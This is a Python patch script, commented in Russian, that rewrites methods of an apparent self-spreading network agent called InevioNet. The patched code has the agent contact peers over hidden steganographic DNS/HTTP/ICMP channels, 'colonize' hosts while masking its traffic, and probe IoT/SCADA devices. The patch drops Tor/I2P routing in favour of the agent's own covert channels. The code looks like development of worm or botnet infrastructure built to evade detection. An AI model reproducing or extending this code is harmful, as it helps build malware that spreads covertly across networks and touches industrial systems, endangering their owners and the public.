# patch96fix.py - P96-fix: убрать I2P/Tor из Organism
import os
import ast
import shutil

ROOT = r"E:\InevioNet"
ORG = os.path.join(ROOT, "inevionet", "organism.py")

BAK = ".bak_p96fix"


def patch_file(path, replacements, label, bak=BAK):
    if not os.path.exists(path):
        print("  [!!] NOT FOUND: " + path)
        return False
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    b = path + bak
    shutil.copy2(path, b)
    print("  [BK] " + os.path.basename(b))
    changed = 0
    for old, new, required in replacements:
        if new and new in content and (not old or old not in content):
            print("  [--] already applied")
            continue
        if old and old in content:
            content = content.replace(old, new, 1)
            changed += 1
            print("  [OK] " + old[:55].strip().replace(chr(10), ' '))
        else:
            if required:
                print("  [!!] NOT FOUND: " + old[:55].strip().replace(chr(10), ' '))
    if changed > 0:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        if path.endswith(".py"):
            try:
                ast.parse(content)
                print("  [OK] syntax " + label)
                return True
            except SyntaxError as e:
                print("  [!!] syntax: " + str(e))
                shutil.copy2(b, path)
                print("  [--] rolled back")
                return False
    return True


# =====================================================================
# 1. communicate(): убрать anon
# =====================================================================

print()
print("=" * 70)
print("  1. communicate(): без I2P/Tor")
print("=" * 70)

old_comm = '''    def communicate(self, peers):
        """P96: общение через скрытые каналы (stego/anon/webrtc)."""
        c_stego = c_anon = c_web = 0
        for peer in peers:
            ip = peer.get("ip")
            if not ip:
                continue
            try:
                # 1. Стеганография (DNS/HTTP/ICMP)
                if self._stego_send(ip, {"type": "hello", "node_id": self.net.node_id}):
                    c_stego += 1
                # 2. Анонимный маршрут (I2P/Tor)
                if self._anon_route(ip, {"type": "hello"}):
                    c_anon += 1
                # 3. WebRTC (если браузер)
                if self._webrtc_send(ip):
                    c_web += 1
                # 4. Industrial (для IoT/SCADA)
                if peer.get("type") in ("lan_device", "service"):
                    self._industrial_probe(ip)
            except Exception as e:
                logger.debug("[Communicate] %s: %s", ip, e)
        
        if c_stego or c_anon or c_web:
            with self._lock:
                self.stats["stego_sent"] = self.stats.get("stego_sent", 0) + c_stego
                self.stats["anon_routes"] = self.stats.get("anon_routes", 0) + c_anon
                self.stats["webrtc_sent"] = self.stats.get("webrtc_sent", 0) + c_web
            logger.info("[Communicate] stego=%d anon=%d webrtc=%d", c_stego, c_anon, c_web)'''

new_comm = '''    def communicate(self, peers):
        """P96-fix: общение через СВОИ каналы (stego/webrtc/industrial).
        
        I2P/Tor НЕ используем - своя анонимность через стеганографию.
        """
        c_stego = c_web = c_ind = 0
        for peer in peers:
            ip = peer.get("ip")
            if not ip:
                continue
            try:
                # 1. Стеганография (DNS/HTTP/ICMP/Timing) - своя анонимность
                if self._stego_send(ip, {"type": "hello", "node_id": self.net.node_id}):
                    c_stego += 1
                # 2. WebRTC (если браузер) - свой P2P
                if self._webrtc_send(ip):
                    c_web += 1
                # 3. Industrial (для IoT/SCADA) - свой IoT
                if peer.get("type") in ("lan_device", "service"):
                    if self._industrial_probe(ip):
                        c_ind += 1
            except Exception as e:
                logger.debug("[Communicate] %s: %s", ip, e)
        
        if c_stego or c_web or c_ind:
            with self._lock:
                self.stats["stego_sent"] = self.stats.get("stego_sent", 0) + c_stego
                self.stats["webrtc_sent"] = self.stats.get("webrtc_sent", 0) + c_web
                self.stats["industrial_probed"] = self.stats.get("industrial_probed", 0) + c_ind
            logger.info("[Communicate] stego=%d webrtc=%d industrial=%d",
                        c_stego, c_web, c_ind)'''

patch_file(ORG, [(old_comm, new_comm, True)], "communicate no anon")


# =====================================================================
# 2. colonize: убрать anon
# =====================================================================

print()
print("=" * 70)
print("  2. colonize(): без anon")
print("=" * 70)

old_col = '''        # P96: маскировка + анонимный маршрут
        try:
            self._mask_traffic()
            self._anon_route(ip)
        except Exception as e:
            logger.debug("[Colonize] mask/anon: %s", e)'''

new_col = '''        # P96-fix: только маскировка (I2P/Tor НЕ используем)
        try:
            self._mask_traffic()
        except Exception as e:
            logger.debug("[Colonize] mask: %s", e)'''

patch_file(ORG, [(old_col, new_col, True)], "colonize no anon")


# =====================================================================
# 3. _anon_route: пометить как deprecated, не вызывать
# =====================================================================

print()
print("=" * 70)
print("  3. _anon_route: deprecated (не вызывается)")
print("=" * 70)

old_anon = '''    def _anon_route(self, ip, payload=None):
        """P96: анонимный маршрут через I2P/Tor."""
        try:
            payload = payload or {"type": "probe", "from": self.net.node_id}
            sent = False
            # I2P
            i2p = getattr(self.net, "i2p", None)
            if i2p and hasattr(i2p, "send"):
                try:
                    i2p.send(ip, payload)
                    sent = True
                except Exception:
                    pass
            # Tor
            tor = getattr(self.net, "tor", None)
            if tor and hasattr(tor, "send"):
                try:
                    tor.send(ip, payload)
                    sent = True
                except Exception:
                    pass
            return sent
        except Exception as e:
            logger.debug("[Anon] %s: %s", ip, e)
        return False'''

new_anon = '''    def _anon_route(self, ip, payload=None):
        """P96-fix: DEPRECATED - I2P/Tor НЕ используем.
        
        Оставлено для совместимости. Своя анонимность - через _stego_send.
        """
        return False'''

patch_file(ORG, [(old_anon, new_anon, False)], "anon deprecated")


# =====================================================================
# 4. stats: убрать anon_routes, добавить industrial_probed
# =====================================================================

print()
print("=" * 70)
print("  4. stats: без anon")
print("=" * 70)

old_stats = '''            "stego_sent": 0,
            "anon_routes": 0,
            "webrtc_sent": 0,
            "started_at": time.time(),'''

new_stats = '''            "stego_sent": 0,
            "webrtc_sent": 0,
            "industrial_probed": 0,
            "started_at": time.time(),'''

patch_file(ORG, [(old_stats, new_stats, True)], "stats no anon")


print()
print("=" * 70)
print("  PATCH 96-FIX DONE")
print("=" * 70)
print("  [OK] communicate: убран I2P/Tor")
print("  [OK] colonize: убран I2P/Tor")
print("  [OK] _anon_route: deprecated (return False)")
print("  [OK] stats: убран anon_routes, добавлен industrial_probed")
print()
print("Перезапуск + 90 сек:")
print("  curl -k https://localhost:8080/api/organism | python -m json.tool")